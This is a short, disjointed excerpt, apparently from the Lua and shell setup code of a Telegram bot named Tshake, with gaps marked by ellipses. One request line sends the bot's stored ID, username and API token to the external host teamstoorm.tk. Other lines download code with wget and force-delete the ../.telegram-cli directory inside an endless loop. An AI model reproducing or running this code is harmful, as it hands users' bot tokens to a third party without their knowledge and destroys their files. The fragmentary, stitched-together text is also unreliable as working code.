...
if UserName ~= '' then
local Get_Info = http.request("http://teamstoorm.tk/GetUser/?id="..UserName)
...
http.request("http://teamstoorm.tk/insert/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
...
rm -fr Tshake.lua
wget "https://raw.githubusercontent.com/ghost11886/Tshake/master/Tshake.lua"
while(true) do
rm -fr ../.telegram-cli
